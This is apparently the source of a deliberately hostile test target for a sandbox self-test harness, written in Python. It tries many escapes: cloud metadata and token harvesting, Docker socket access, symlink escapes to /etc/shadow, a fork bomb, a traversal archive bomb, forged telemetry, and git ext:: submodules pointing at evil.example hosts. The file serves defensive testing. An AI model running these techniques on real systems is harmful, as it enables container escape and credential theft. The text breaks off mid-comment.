#!/usr/bin/env python3
"""A hostile target for the sandbox self test: ours, and deliberately bad.

    python3 hostile.py <case> <nonce> <gateway> <canary-port> [<host-canary-dir>]

It tries one way out of the sandbox (the case) and prints what it saw as the last line of stdout,
one JSON object. The harness never trusts that line: whether the attempt was blocked and logged is
decided from the harness's own evidence (the syscall trace, the network logger, the host firewall's
log, docker inspect, the run telemetry). The report can only make a case fail, never pass.

Every network call is blocking, with an alarm as the time limit, so a refused or unreachable
connect shows up in the trace as the error it is (not as "in progress").
"""
import ctypes
import errno
import json
import os
import resource
import signal
import socket
import ssl
import struct
import subprocess
import sys
import tarfile
import threading
import time


class Timeout(Exception):
    pass


def _alarm(signum, frame):
    raise Timeout()


signal.signal(signal.SIGALRM, _alarm)


def attempt(fn, seconds=3.0):
    """Runs fn under a time limit; {"ok": True, ...} only when it got through."""
    signal.setitimer(signal.ITIMER_REAL, seconds)
    try:
        return {"ok": True, **(fn() or {})}
    except Timeout:
        return {"ok": False, "error": "timeout"}
    except OSError as e:
        return {"ok": False, "errno": e.errno, "error": errno.errorcode.get(e.errno, type(e).__name__)}
    except Exception as e:  # noqa: BLE001 - any failure is a result here
        return {"ok": False, "error": type(e).__name__}
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)


def tcp(addr, port, family=socket.AF_INET, send=None):
    def go():
        s = socket.socket(family, socket.SOCK_STREAM)
        try:
            s.connect((addr, port))
            out = {"connected": True}
            if send is not None:
                s.sendall(send)
                out["received"] = len(s.recv(4096))
            return out
        finally:
            s.close()
    return {"to": f"{addr}:{port}", **attempt(go)}


def udp(addr, port, payload, family=socket.AF_INET):
    def go():
        s = socket.socket(family, socket.SOCK_DGRAM)
        try:
            s.sendto(payload, (addr, port))
            return {"sent": True, "received": len(s.recv(4096))}
        finally:
            s.close()
    return {"to": f"udp {addr}:{port}", **attempt(go, 2.0)}


def tls(addr, port, sni, path="/dns-query?dns=AAABAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE"):
    def go():
        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            raw.connect((addr, port))
            s = ssl.create_default_context().wrap_socket(raw, server_hostname=sni)
            s.sendall(f"GET {path} HTTP/1.1\r\nHost: {sni}\r\nAccept: application/dns-message\r\n\r\n".encode())
            return {"tls": True, "received": len(s.recv(4096))}
        finally:
            raw.close()
    return {"to": f"tls {sni}@{addr}:{port}", **attempt(go)}


def resolve(name):
    def go():
        return {"addrs": sorted({a[4][0] for a in socket.getaddrinfo(name, 443, socket.AF_INET, socket.SOCK_STREAM)})[:4]}
    return {"name": name, **attempt(go)}


def http_get(addr, port, path, host, extra=""):
    return tcp(addr, port, send=f"GET {path} HTTP/1.1\r\nHost: {host}\r\n{extra}Connection: close\r\n\r\n".encode())


def checksum(b):
    if len(b) % 2:
        b += b"\0"
    s = sum(struct.unpack(f"!{len(b) // 2}H", b))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def echo_request():
    body = b"isokron-selftest"
    head = struct.pack("!BBHHH", 8, 0, 0, 0x1234, 1)
    return struct.pack("!BBHHH", 8, 0, checksum(head + body), 0x1234, 1) + body


def icmp(addr, kind):
    def go():
        t = socket.SOCK_RAW if kind == "raw" else socket.SOCK_DGRAM
        s = socket.socket(socket.AF_INET, t, socket.IPPROTO_ICMP)
        try:
            s.sendto(echo_request(), (addr, 0))
            return {"sent": True, "received": len(s.recv(1024))}
        finally:
            s.close()
    return {"to": f"icmp-{kind} {addr}", **attempt(go, 2.0)}


def raw_socket(family, kind, proto):
    def go():
        socket.socket(family, kind, proto).close()
        return {"opened": True}
    return attempt(go)


def write(path, data=b"x"):
    def go():
        with open(path, "wb") as f:
            f.write(data)
        return {"written": True}
    return {"path": path, **attempt(go)}


def read(path):
    def go():
        with open(path, "rb") as f:
            b = f.read(1 << 20)
        return {"bytes": len(b), "canary": b.count(b"isk-canary-")}
    return {"path": path, **attempt(go)}


def unix(path):
    def go():
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        try:
            s.connect(path)
            s.sendall(b"GET /version HTTP/1.1\r\nHost: x\r\n\r\n")
            return {"received": len(s.recv(4096))}
        finally:
            s.close()
    return {"path": path, **attempt(go)}


def ipv6_addresses():
    try:
        with open("/proc/net/if_inet6") as f:
            return sum(1 for line in f if not line.split()[-1] == "lo")
    except OSError:
        return None


def mount_tmpfs():
    def go():
        libc = ctypes.CDLL(None, use_errno=True)
        if libc.mount(b"none", b"/mnt", b"tmpfs", 0, None) != 0:
            e = ctypes.get_errno()
            raise OSError(e, os.strerror(e))
        return {"mounted": True}
    return attempt(go)


def fork_bomb(most=1500, seconds=20.0):
    kids, err, t0 = [], None, time.monotonic()
    while len(kids) < most and time.monotonic() - t0 < seconds:
        try:
            pid = os.fork()
        except OSError as e:
            err = errno.errorcode.get(e.errno, str(e.errno))
            break
        if pid == 0:
            # Each child becomes a small process at once, so the bomb runs into the process limit
            # rather than the memory limit (a forked interpreter copies pages as it runs).
            try:
                signal.setitimer(signal.ITIMER_REAL, 0)
                os.execv("/bin/sleep", ["sleep", "120"])
            except BaseException:
                pass
            os._exit(0)
        kids.append(pid)
    for p in kids:
        try:
            os.kill(p, signal.SIGKILL)
        except OSError:
            pass
    for p in kids:
        try:
            os.waitpid(p, 0)
        except OSError:
            pass
    return {"forked": len(kids), "error": err, "seconds": round(time.monotonic() - t0, 2)}


def case_direct_ip(nonce, gw, canary):
    return {"attempts": [tcp("1.1.1.1", 443), tcp("8.8.8.8", 53), udp("8.8.8.8", 53, b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"), tcp("140.82.112.3", 443)]}


def case_doh_ip(nonce, gw, canary):
    return {"attempts": [tls("1.1.1.1", 443, "cloudflare-dns.com"), tls("8.8.8.8", 443, "dns.google"), tls("9.9.9.9", 443, "dns.quad9.net"), tcp("1.1.1.1", 853)],
            "by_name": [resolve("dns.google"), tls("dns.google", 443, "dns.google")]}


def capabilities():
    """The capability sets and no_new_privs of this process, as /proc/self/status gives them."""
    out = {}
    try:
        with open("/proc/self/status") as f:
            for line in f:
                k, _, v = line.partition(":")
                if k in ("CapInh", "CapPrm", "CapEff", "CapBnd", "CapAmb", "NoNewPrivs"):
                    out[k] = v.strip()
    except OSError as e:
        out["error"] = errno.errorcode.get(e.errno, str(e.errno))
    return out


def case_raw_socket(nonce, gw, canary):
    return {"caps": capabilities(), "attempts": [
        {"to": "AF_INET SOCK_RAW IPPROTO_TCP", **raw_socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)},
        {"to": "AF_INET SOCK_RAW IPPROTO_RAW", **raw_socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)},
        {"to": "AF_PACKET SOCK_RAW ETH_P_ALL", **raw_socket(getattr(socket, "AF_PACKET", 17), socket.SOCK_RAW, socket.htons(3))},
    ]}


def case_ipv6(nonce, gw, canary):
    return {"ipv6_addresses": ipv6_addresses(), "attempts": [
        tcp("2606:4700:4700::1111", 443, socket.AF_INET6),
        udp("2001:4860:4860::8888", 53, b"\x00", socket.AF_INET6),
        tcp("fe80::1%eth0", 443, socket.AF_INET6),
        tcp("::ffff:1.1.1.1", 443, socket.AF_INET6),
    ]}


def case_icmp(nonce, gw, canary):
    return {"attempts": [icmp("1.1.1.1", "dgram"), icmp(gw, "dgram"), icmp("1.1.1.1", "raw"), icmp(gw, "raw")]}


def case_docker_host(nonce, gw, canary):
    name = resolve("host.docker.internal")
    sink = name.get("addrs", [None])[0] if name.get("ok") else None
    att = [name]
    if sink:
        att.append(http_get(sink, 2375, "/version", "host.docker.internal"))
    att += [http_get(gw, 2375, "/version", gw), tcp(gw, 2376), tcp(gw, canary, send=nonce.encode()), tcp(gw, 22), tcp("172.17.0.1", 2375)]
    att += [unix("/var/run/docker.sock"), unix("/run/docker.sock"), unix("/run/containerd/containerd.sock")]
    return {"attempts": att}


def case_metadata(nonce, gw, canary):
    return {"attempts": [
        http_get("169.254.169.254", 80, "/latest/meta-data/iam/security-credentials/", "169.254.169.254"),
        http_get("169.254.169.254", 80, "/metadata/instance?api-version=2021-02-01", "169.254.169.254", "Metadata: true\r\n"),
        http_get("168.63.129.16", 80, "/machine?comp=goalstate", "168.63.129.16", "x-ms-version: 2012-11-30\r\n"),
        resolve("metadata.google.internal"),
        http_get("metadata.google.internal", 80, "/computeMetadata/v1/", "metadata.google.internal", "Metadata-Flavor: Google\r\n"),
    ]}


TOKEN_NAMES = ("GITHUB_TOKEN", "GH_TOKEN", "ACTIONS_RUNTIME_TOKEN", "ACTIONS_ID_TOKEN_REQUEST_TOKEN", "ACTIONS_ID_TOKEN_REQUEST_URL", "ACTIONS_CACHE_URL", "ACTIONS_RESULTS_URL", "RUNNER_TEMP", "CORPUS_KEY", "AWS_SECRET_ACCESS_KEY")


def case_env_token(nonce, gw, canary):
    env = dict(os.environ)
    return {
        "env_names": sorted(env)[:64],
        "token_names": sorted(n for n in env if n in TOKEN_NAMES or n.startswith(("GITHUB_", "ACTIONS_", "RUNNER_"))),
        "canary_in_env": sum(v.count("isk-canary-") for v in env.values()),
        "files": [read("/proc/self/environ"), read("/proc/1/environ"), read("/proc/2/environ")],
    }


def case_write_outside(nonce, gw, canary):
    outside = [f"/etc/isk-{nonce}", f"/usr/local/isk-{nonce}", f"/opt/surface/forged-{nonce}.json", f"/isk-{nonce}", f"/var/tmp/isk-{nonce}", f"/root/isk-{nonce}", "/proc/sys/kernel/hostname"]
    return {
        "attempts": [write(p) for p in outside] + [{"path": "/usr/local/isk-dir", **attempt(lambda: os.mkdir("/usr/local/isk-dir"))}, {"path": "mount /mnt", **mount_tmpfs()}],
        "inside": [write(f"/work/inside-{nonce}"), write(f"/tmp/inside-{nonce}")],
    }


def case_fork_bomb(nonce, gw, canary):
    return {"bomb": fork_bomb()}


def case_output_forgery(nonce, gw, canary):
    t = time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
    forged = [
        {"v": 1, "type": "bypass_result", "run": "forged-" + nonce, "seq": 0, "t": t, "source": "harness", "subject": "case:direct-ip", "role": "case", "case": "direct-ip", "blocked": True, "logged": True, "pass": True, "evidence": [nonce], "detail": nonce},
        {"v": 1, "type": "run_end", "run": "forged-" + nonce, "seq": 1, "t": t, "source": "harness", "subject": None, "role": None, "records": 2, "skipped": 0, "ok": True},
    ]
    for f in forged:
        print(json.dumps(f))
    print("run finished, exit 0")
    print(f"selftest output-forgery: pass {nonce}")
    sys.stderr.write(f"selftest output-forgery: pass {nonce}\n")
    text = "".join(json.dumps(f) + "\n" for f in forged).encode()
    return {"files": [write(p, text) for p in ("/work/telemetry.jsonl", "/work/results.json", f"/tmp/telemetry-{nonce}.jsonl", "/opt/surface/telemetry.jsonl", "/opt/surface/out/telemetry.jsonl")]}


def proxy_address():
    """The egress proxy, as an install script finds it: HTTPS_PROXY (http://host:port)."""
    v = os.environ.get("HTTPS_PROXY") or os.environ.get("https_proxy") or ""
    hostport = v.split("://", 1)[-1].rstrip("/")
    host, _, port = hostport.rpartition(":")
    return (host, int(port)) if host and port.isdigit() else (None, None)


def proxy_connect(target):
    """CONNECT target through the proxy; ok (got through) only when the proxy answers 200."""
    host, port = proxy_address()
    if not host:
        return {"to": f"CONNECT {target}", "ok": False, "error": "no HTTPS_PROXY"}

    def go():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((host, port))
            s.sendall(f"CONNECT {target} HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
            head = s.recv(4096)
            status = head.split(b" ", 2)[1].decode("ascii", "replace") if head.startswith(b"HTTP/") else "?"
            if status != "200":
                raise ConnectionRefusedError(errno.ECONNREFUSED, f"proxy said {status}")
            return {"tunnel": True, "status": status, "received": len(head)}
        finally:
            s.close()
    return {"to": f"CONNECT {target}", **attempt(go)}


def proxy_plain(url, host_header):
    """A plain HTTP request through the proxy (absolute URL); ok only on a 2xx answer."""
    host, port = proxy_address()
    if not host:
        return {"to": f"GET {url}", "ok": False, "error": "no HTTPS_PROXY"}

    def go():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((host, port))
            s.sendall(f"GET {url} HTTP/1.1\r\nHost: {host_header}\r\nConnection: close\r\n\r\n".encode())
            head = s.recv(4096)
            status = head.split(b" ", 2)[1].decode("ascii", "replace") if head.startswith(b"HTTP/") else "?"
            if not status.startswith("2"):
                raise ConnectionRefusedError(errno.ECONNREFUSED, f"proxy said {status}")
            return {"status": status, "received": len(head)}
        finally:
            s.close()
    return {"to": f"GET {url}", **attempt(go)}


def proxy_control(target, sni):
    """The positive control: CONNECT to the one allowed host, then TLS and a request through the tunnel."""
    host, port = proxy_address()
    if not host:
        return {"to": f"CONNECT {target}", "control": True, "ok": False, "error": "no HTTPS_PROXY"}

    def go():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((host, port))
            s.sendall(f"CONNECT {target} HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
            head = s.recv(4096)
            status = head.split(b" ", 2)[1].decode("ascii", "replace") if head.startswith(b"HTTP/") else "?"
            if status != "200":
                raise ConnectionRefusedError(errno.ECONNREFUSED, f"proxy said {status}")
            t = ssl.create_default_context().wrap_socket(s, server_hostname=sni)
            t.sendall(f"GET /-/ping HTTP/1.1\r\nHost: {sni}\r\nConnection: close\r\n\r\n".encode())
            return {"status": status, "received": len(t.recv(4096))}
        finally:
            s.close()
    return {"to": f"CONNECT {target}", "control": True, **attempt(go, 15.0)}


# The install network: the egress proxy (HTTPS_PROXY) allows registry.npmjs.org on 443 and nothing
# else. These cases ask it for everything else, and go around it. install-proxy-host also asks for the
# registry itself, the positive control: a proxy that refused everything would prove nothing.
def case_install_proxy_host(nonce, gw, canary):
    return {"attempts": [proxy_control("registry.npmjs.org:443", "registry.npmjs.org"), proxy_connect("example.com:443"), proxy_connect("evil.example:443"), proxy_plain("http://example.com/", "example.com")]}


def case_install_proxy_ip(nonce, gw, canary):
    return {"attempts": [proxy_connect("1.1.1.1:443"), proxy_connect("104.16.1.34:443"), proxy_connect("[2606:4700:4700::1111]:443")]}


def case_install_proxy_port(nonce, gw, canary):
    return {"attempts": [proxy_connect("registry.npmjs.org:80"), proxy_connect("registry.npmjs.org:22"), proxy_connect("registry.npmjs.org:8443")]}


def case_install_direct(nonce, gw, canary):
    return {"attempts": [tcp("1.1.1.1", 443), tcp("140.82.112.3", 443), tcp("104.16.1.34", 443),
                         udp("8.8.8.8", 53, b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x08registry\x05npmjs\x03org\x00\x00\x01\x00\x01")],
            "by_name": [resolve("registry.npmjs.org")]}


def case_install_metadata(nonce, gw, canary):
    return {"attempts": case_metadata(nonce, gw, canary)["attempts"] + [proxy_connect("169.254.169.254:443"), proxy_connect("168.63.129.16:443")]}


def case_install_host(nonce, gw, canary):
    return case_docker_host(nonce, gw, canary)


# Where a runner keeps what a target must never reach, and the sandbox's own places: symlink-escape
# links to each from its work folder and reads and writes through the links. The harness also
# passes the host folder where it keeps a canary file (in its --out folder), and that folder and
# its canary are linked to as well.
LINK_TARGETS = ["/", "/etc", "/etc/shadow", "/etc/passwd", "/root", "/proc/1/root", "/proc/1/root/etc", "/proc/self/root/etc",
                "/var/run/docker.sock", "/run/containerd/containerd.sock", "/var/lib/docker", "/var/lib/docker/volumes",
                "/var/lib/isokron-docker", "/home/runner", "/home/runner/work/_temp", "/opt/surface", "/sys/fs/cgroup", "/dev/shm/.."]


def read_through(path):
    def go():
        if os.path.isdir(path):
            names = os.listdir(path)[:200]
            return {"listed": len(names), "canary": sum(n.count("isk-canary-") for n in names)}
        with open(path, "rb") as f:
            b = f.read(1 << 16)
        return {"bytes": len(b), "canary": b.count(b"isk-canary-")}
    return {"path": path, **attempt(go)}


def write_through(link, via, nonce):
    """A write through a link: into it when it points at a folder, onto it when it points at a file."""
    target = os.path.join(link, f"isk-{nonce}") if os.path.isdir(link) else link

    def go():
        fd = os.open(target, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o644)
        try:
            os.write(fd, f"isk-{nonce}\n".encode())
        finally:
            os.close(fd)
        return {"written": True}
    return {"path": target, "via": via, **attempt(go)}


def case_symlink_escape(nonce, gw, canary, host_canary=None):
    base = f"/work/links-{nonce}"
    os.makedirs(base, exist_ok=True)
    made, reads, writes = [], [], []
    targets = LINK_TARGETS + ([host_canary, f"{host_canary}/canary"] if host_canary else [])
    for i, t in enumerate(targets):
        link = f"{base}/l{i:02d}"
        made.append({"to": t, **attempt(lambda: os.symlink(t, link))})
        reads.append(read_through(link))
        writes.append(write_through(link, t, nonce))
    # A link in /tmp to the work folder's parent, and one to /proc/self/fd/0's file: the same, by other ways.
    made.append({"to": "/work/..", **attempt(lambda: os.symlink("/work/..", f"/tmp/isk-up-{nonce}"))})
    reads.append(read_through(f"/tmp/isk-up-{nonce}/etc/hostname"))
    # For the result readout, which runs after the case (our code, over the work volume): the files
    # the corpus reads out are links to outside (the last part), or sit below a folder that is a link.
    planted = []
    os.makedirs("/work/lock", exist_ok=True)
    for path, to in (("/work/lock/freeze.txt", "/etc/passwd"), ("/work/lock/go-version-m.txt", "/proc/self/environ")):
        planted.append({"path": path, "to": to, **attempt(lambda: os.symlink(to, path))})
    real = f"/work/.isk-{nonce}-pkg"
    os.makedirs(real, exist_ok=True)
    with open(f"{real}/package-lock.json", "w") as f:
        f.write(f'{{"planted": "isk-{nonce}"}}\n')
    planted.append({"path": "/work/pkg", "to": real, **attempt(lambda: os.symlink(real, "/work/pkg"))})
    seen = sum(int(r.get("canary") or 0) for r in reads)
    return {"links": made, "planted": planted, "reads": reads, "attempts": writes, "canary_seen": seen, "host_canary": host_canary}


# Sockets of the host that a sandboxed process must never reach: the Docker API, containerd and its
# shims, runsc, systemd, D-Bus, syslog. Then abstract sockets (named by a leading NUL, in the
# network namespace, not on any filesystem).
SOCKET_PATHS = ["/var/run/docker.sock", "/run/docker.sock", "/run/containerd/containerd.sock", "/run/containerd/containerd.sock.ttrpc",
                "/var/run/docker/containerd/containerd.sock", "/run/runsc/runsc.sock", "/var/run/docker/libnetwork/isk.sock",
                "/run/systemd/private", "/run/systemd/journal/socket", "/run/dbus/system_bus_socket", "/dev/log", "/run/user/1001/docker.sock"]
ABSTRACT_NAMES = ["\0/containerd-shim/moby/isk/shim.sock", "\0/run/containerd/s/isk", "\0/tmp/.X11-unix/X0", "\0isk-absent"]
LINGER = {}


def listener(kind, where, nonce):
    """A listening socket that answers once with a greeting: what a later stage might connect to."""
    def go():
        if kind == "tcp":
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("0.0.0.0", where))
        else:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.bind(where)
        s.listen(8)

        def serve():
            while True:
                try:
                    c, _ = s.accept()
                    c.sendall(f"isk-{nonce}-hello\n".encode())
                    c.close()
                except OSError:
                    return
        threading.Thread(target=serve, daemon=True).start()
        return {"listening": True}
    return {"to": f"{kind} {where!r}", **attempt(go)}


def case_unix_socket(nonce, gw, canary):
    att = [unix(p) for p in SOCKET_PATHS] + [unix(n) for n in ABSTRACT_NAMES]
    listeners = [listener("unix", f"/work/isk-{nonce}.sock", nonce), listener("unix", f"/tmp/isk-{nonce}.sock", nonce),
                 listener("unix", f"\0isk-listen-{nonce}", nonce), listener("tcp", 47124, nonce)]
    return {"attempts": att, "listeners": listeners}


LINGER["unix-socket"] = 600  # like a server: it keeps running until the stage is torn down

# install-archive-bomb: more than the work volume may hold (gvisor.json volume_fs_mb; the unit
# tests check this is past it), in one allocation; and an archive of about a megabyte that expands
# to a gibibyte, with twenty thousand entries, deep folders and entries that climb out.
BOMB_GIB = 7
BOMB_FILES = 20000
# Time budgets of the steps after the archive is built (a few seconds): together well inside the
# harness's limit for a case (bin/sandbox-selftest.mjs CASE_MS, 120 s); the unit tests check it.
BOMB_BUDGET = {"build": 15.0, "unpack": 35.0, "gnu_tar": 20.0, "punch": 5.0, "fallocate": 15.0, "fill": 15.0}


class Zeros:
    def __init__(self, n):
        self.left = n

    def read(self, n=-1):
        n = self.left if n is None or n < 0 else min(n, self.left)
        self.left -= n
        return bytes(n)


def build_bomb(path, nonce):
    with tarfile.open(path, "w:gz", compresslevel=6, format=tarfile.PAX_FORMAT) as tf:
        def add(name, size=0, kind=tarfile.REGTYPE, link=""):
            ti = tarfile.TarInfo(name)
            ti.type, ti.size, ti.linkname, ti.mode = kind, size, link, 0o644
            tf.addfile(ti, Zeros(size) if size else None)
        add("zeros.bin", 1 << 30)
        for i in range(BOMB_FILES):
            add(f"many/{i // 1000:02d}/{i:05d}")
        add("deep/" + "d/" * 200 + "f")
        add("deeper/" + "d/" * 2100 + "f")
        add(f"../../../../../../../../etc/isk-{nonce}-dotdot")
        add(f"/etc/isk-{nonce}-abs")
        add(f"/opt/surface/isk-{nonce}-abs")
        add(f"../../../../../../../../isk-{nonce}-root")
        add("escape", kind=tarfile.SYMTYPE, link="/etc")
        add(f"escape/isk-{nonce}-vialink")
        add("hard", kind=tarfile.LNKTYPE, link="/etc/passwd")


def unpack(path, root, budget=BOMB_BUDGET["unpack"]):
    """Every entry trusted (no filter), one by one, the way a naive unpacker goes: what landed, what was refused."""
    kw = {"filter": "fully_trusted"} if hasattr(tarfile, "fully_trusted_filter") else {}
    ok, refused, climbs, t0 = 0, {}, [], time.monotonic()
    with tarfile.open(path, "r:gz") as tf:
        for m in tf:
            if time.monotonic() - t0 > budget:
                refused["time"] = refused.get("time", 0) + 1
                break
            try:
                tf.extract(m, root, set_attrs=False, **kw)
                ok += 1
                landed = True
                err = None
            except Exception as e:  # noqa: BLE001 - every refusal is a result here
                landed = False
                err = errno.errorcode.get(getattr(e, "errno", None) or 0, type(e).__name__)
                refused[err] = refused.get(err, 0) + 1
            if m.name.startswith(("..", "/")) or m.name.startswith("escape/") or m.name == "hard":
                climbs.append({"name": m.name[-60:], "ok": landed, "error": err})
    return {"entries_ok": ok, "refused": refused, "climbs": climbs, "seconds": round(time.monotonic() - t0, 2)}


def fallocate(path, size):
    def go():
        libc = ctypes.CDLL(None, use_errno=True)
        libc.fallocate.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_long, ctypes.c_long]
        fd = os.open(path, os.O_WRONLY | os.O_CREAT, 0o600)
        try:
            if libc.fallocate(fd, 0, 0, size) != 0:
                e = ctypes.get_errno()
                raise OSError(e, os.strerror(e))
            return {"bytes": size}
        finally:
            os.close(fd)
    return {"path": path, **attempt(go, BOMB_BUDGET["fallocate"])}


def punch_and_zero(path, mb=64):
    """Zero-ranges and punches its own file: what could turn into holes in the volume's image file,
    a loop device's backing file, if the volume's filesystem passed them down (the later stage checks)."""
    def go():
        libc = ctypes.CDLL(None, use_errno=True)
        libc.fallocate.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_long, ctypes.c_long]
        fd = os.open(path, os.O_WRONLY | os.O_CREAT, 0o600)
        try:
            for i in range(mb):
                os.write(fd, bytes(1 << 20))
            os.fsync(fd)
            res = {}
            for name, mode, off, ln in (("zero_range", 0x10, 0, 32 << 20), ("punch_hole", 0x02 | 0x01, 32 << 20, 16 << 20)):
                res[name] = libc.fallocate(fd, mode, off, ln) == 0 or errno.errorcode.get(ctypes.get_errno(), "?")
            os.fsync(fd)
            return res
        finally:
            os.close(fd)
    return {"path": path, **attempt(go, BOMB_BUDGET["punch"])}


def fill(path, size, budget=BOMB_BUDGET["fill"]):
    """Writes zeros until ENOSPC, the size, or the time budget: where allocation is not supported."""
    n, err, t0, chunk = 0, None, time.monotonic(), bytes(16 << 20)
    try:
        with open(path, "wb") as f:
            while n < size and time.monotonic() - t0 < budget:
                f.write(chunk)
                n += len(chunk)
    except OSError as e:
        err = errno.errorcode.get(e.errno, str(e.errno))
    return {"bytes": n, "error": err, "ok": n >= size and err is None}


def statfs(path):
    try:
        st = os.statvfs(path)
        return {"mb": st.f_blocks * st.f_frsize >> 20, "free_mb": st.f_bavail * st.f_frsize >> 20, "inodes": st.f_files, "free_inodes": st.f_favail}
    except OSError as e:
        return {"error": errno.errorcode.get(e.errno, str(e.errno))}


def case_install_archive_bomb(nonce, gw, canary):
    root = f"/work/bomb-{nonce}"
    os.makedirs(f"{root}/gnu", exist_ok=True)
    out = {"statfs_before": statfs("/work")}
    tgz = f"/tmp/bomb-{nonce}.tgz"
    t0 = time.monotonic()
    signal.setitimer(signal.ITIMER_REAL, BOMB_BUDGET["build"])
    try:
        build_bomb(tgz, nonce)
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    out["archive"] = {"bytes": os.path.getsize(tgz), "seconds": round(time.monotonic() - t0, 2)}
    out["unpack"] = unpack(tgz, root)
    try:
        r = subprocess.run(["tar", "-xzf", tgz, "-C", f"{root}/gnu"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=BOMB_BUDGET["gnu_tar"])
        out["gnu_tar"] = {"exit": r.returncode}
    except Exception as e:  # noqa: BLE001
        out["gnu_tar"] = {"error": type(e).__name__}
    os.unlink(tgz)
    out["punch"] = punch_and_zero(f"{root}/punch.bin")
    out["fallocate"] = fallocate(f"{root}/fill.bin", BOMB_GIB << 30)
    if not out["fallocate"]["ok"] and out["fallocate"].get("error") in ("EOPNOTSUPP", "ENOTSUP", "ENOSYS", "EINVAL"):
        out["fill"] = fill(f"{root}/fill.bin", BOMB_GIB << 30)
    out["statfs_after"] = statfs("/work")
    return out


# output-flood: stdout as fast as it goes, more than Docker may keep of a container's output
# (gvisor.json container_logs), for at most FLOOD_SECONDS.
FLOOD_BYTES = 2 << 30
FLOOD_SECONDS = 40.0


def case_output_flood(nonce, gw, canary):
    line = (f"isk-flood-{nonce} " + "x" * 4000 + "\n").encode()
    chunk = line * 256
    n, err, t0 = 0, None, time.monotonic()
    out = sys.stdout.buffer
    try:
        while n < FLOOD_BYTES and time.monotonic() - t0 < FLOOD_SECONDS:
            out.write(chunk)
            n += len(chunk)
        out.flush()
    except OSError as e:
        err = errno.errorcode.get(e.errno, str(e.errno))
    return {"flood": {"bytes": n, "seconds": round(time.monotonic() - t0, 2), "error": err}}


# install-git-submodule: a superproject whose submodules point at an ext:: transport (which would
# run a command of ours), a file:// path, and an outside host, cloned with --recurse-submodules the
# way an install that fetches a git dependency would, and an npm git dependency on another outside
# host. Every outside host is reserved (.example). No LFS: git-lfs is not in the node*-build images.
def git(args, cwd, timeout=60):
    env = {**os.environ, "GIT_TERMINAL_PROMPT": "0", "GIT_AUTHOR_NAME": "isk", "GIT_AUTHOR_EMAIL": "isk@example.invalid",
           "GIT_COMMITTER_NAME": "isk", "GIT_COMMITTER_EMAIL": "isk@example.invalid"}
    try:
        r = subprocess.run(["git", *args], cwd=cwd, env=env, capture_output=True, timeout=timeout)
        return {"git": " ".join(args[:2])[:60], "exit": r.returncode, "err": r.stderr.decode(errors="replace")[-1200:], "out": r.stdout.decode(errors="replace")[:2000]}
    except Exception as e:  # noqa: BLE001
        return {"git": " ".join(args[:2])[:60], "error": type(e).__name__}


def case_install_git_submodule(nonce, gw, canary):
    base = f"/tmp/git-{nonce}"
    marker = f"/tmp/isk-ext-{nonce}"
    with open(marker, "w") as f:
        f.write(f"#!/bin/sh\necho ext-ran > /work/isk-ext-ran-{nonce}\nexit 1\n")
    os.chmod(marker, 0o755)
    steps = []
    src, sup = f"{base}/src", f"{base}/super"
    os.makedirs(src)
    os.makedirs(sup)
    steps.append(git(["init", "-q", "-b", "main", src], base))
    with open(f"{src}/isk-file-{nonce}", "w") as f:
        f.write("followed\n")
    steps += [git(["add", "."], src), git(["commit", "-qm", "src"], src)]
    head = git(["rev-parse", "HEAD"], src).get("out", "").strip() or "0" * 40
    steps.append(git(["init", "-q", "-b", "main", sup], base))
    with open(f"{sup}/.gitmodules", "w") as f:
        f.write(f'[submodule "file"]\n\tpath = file\n\turl = file://{src}\n'
                f'[submodule "ext"]\n\tpath = ext\n\turl = ext::{marker} %S\n'
                f'[submodule "http"]\n\tpath = http\n\turl = https://sub.evil.example/isk-{nonce}.git\n')
    with open(f"{sup}/README", "w") as f:
        f.write("superproject\n")
    # The gitlinks go in by hand (no folder of theirs in the work tree), so the other files are added
    # by name: `git add .` would take the gitlinks out again as deleted.
    for path in ("file", "ext", "http"):
        steps.append(git(["update-index", "--add", "--cacheinfo", f"160000,{head},{path}"], sup))
    steps += [git(["add", ".gitmodules", "README"], sup), git(["commit", "-qm", "super"], sup)]
    listed = git(["ls-tree", "HEAD"], sup).get("out", "")
    clone = f"/work/clone-{nonce}"
    cl = git(["clone", "--recurse-submodules", sup, clone], "/tmp", timeout=90)
    try:
        r = subprocess.run(["npm", "install", "--prefix", f"/tmp/npm-{nonce}", "--no-audit", "--no-fund", "--ignore-scripts",
                            f"git+https://npm.evil.example/isk-npm-{nonce}.git"], capture_output=True, timeout=60)
        npm = {"exit": r.returncode, "err": r.stderr.decode(errors="replace")[-200:]}
    except Exception as e:  # noqa: BLE001
        npm = {"error": type(e).__name__}
    return {"setup": [x for x in steps if x.get("exit") not in (0, None) or x.get("error")][:6], "gitlinks": listed.count("160000"), "clone": cl, "npm": npm,
            "cloned": os.path.isdir(f"{clone}/.git"), "file_followed": os.path.exists(f"{clone}/file/isk-file-{nonce}"),
            "ext_ran": os.path.exists(f"/work/isk-ext-ran-{nonce}")}


# background: a daemon by double fork and setsid, and a nohup-style child that ignores hangups and
# TERM, each appending to a heartbeat file in the work folder; the case itself ignores TERM too and
